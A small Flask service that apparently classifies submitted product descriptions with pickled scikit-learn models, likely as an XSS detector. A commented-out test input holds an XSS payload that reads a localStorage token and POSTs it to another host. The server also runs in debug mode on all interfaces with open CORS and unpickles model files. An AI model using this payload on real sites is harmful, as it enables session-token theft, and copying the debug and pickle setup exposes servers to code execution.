from flask import Flask,jsonify,request
from flask_cors import CORS
import numpy as np
import pickle


app = Flask(__name__)
CORS(app)

@app.route('/', methods=['POST', 'GET'])
def fun():

    print("#############")
    product = request.json
    text = product['description']
    # print("Description : " + product.description)
    print("#############")
    loaded_vec = pickle.load(open('model.sav', 'rb'))
    # text = '''img src onerror="const data = {token: localStorage.getItem('user_id')};fetch('http://localhost:4200/', {method: 'POST',headers: {'Content-Type': 'application/json',},body: JSON.stringify(data)}).then((response) => response.json()).then((data) => {console.log('Success:', data);}).catch((error) => {console.error('Error:', error);});" />'''
    dt = np.array([text])
    p=loaded_vec.transform(dt).toarray()
    loaded_model = pickle.load(open('vec.sav', 'rb'))
    return str(loaded_model.predict(p)[0])  

    

if __name__=='__main__':
    app.run(host="0.0.0.0",port=5000,debug=True)